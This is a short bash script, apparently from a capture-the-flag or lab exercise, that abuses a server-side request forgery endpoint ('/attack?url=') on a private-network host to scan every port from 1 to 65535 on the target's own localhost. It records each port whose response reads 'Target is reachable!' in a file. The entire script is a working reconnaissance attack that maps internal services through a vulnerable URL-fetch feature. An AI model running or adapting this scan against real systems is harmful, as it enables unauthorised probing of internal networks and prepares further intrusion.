#!/bin/bash

varibl=1;
file="hello_ports.txt"

rm $file;

while [ "$varibl" -le 65535 ]
do
	echo $varibl
	curl -s "http://10.10.51.41:8000/attack?url=http://user@127.0.0.1:$varibl" | grep 'Target is reachable!' && echo $varibl >> $file
(("varibl++"))
done
